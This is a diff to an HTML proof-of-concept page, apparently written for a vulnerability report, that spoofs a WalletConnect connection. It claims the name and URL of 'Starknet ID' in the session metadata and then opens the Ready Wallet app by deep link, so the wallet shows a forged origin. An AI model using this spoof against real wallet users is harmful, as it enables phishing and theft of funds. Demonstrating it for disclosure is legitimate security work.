@@ -6,13 +6,12 @@
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Spoof connect promptttt</button>
+  <button id="connect">Spoof connect prompt</button>
   <pre id="log"></pre>
 
-  <!-- Pakai bundle dari unpkg -->
-  <script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>
+  <script type="module">
+    import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
 
-  <script>
     const REAL_ORIGIN = location.origin;
     const CLAIMED_URL = 'https://app.starknet.id';
     const CLAIMED_NAME = 'Starknet ID';
@@ -25,7 +24,7 @@
       try {
         log('Initializing...');
 
-        const provider = await window.SignClient.init({
+        const provider = await UniversalProvider.init({
           projectId: '2f05ae7f1116030fde2d36508f472bfb',
           metadata: {
             name: CLAIMED_NAME,
@@ -51,7 +50,7 @@
         if (uri) {
           log('Real origin: ' + REAL_ORIGIN);
           log('Claimed URL: ' + CLAIMED_URL);
-          log('URI: ' + uri);
+          log('URI: ' + uri.substring(0, 50) + '...');
           log('Opening Ready Wallet...');
           location.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
         }
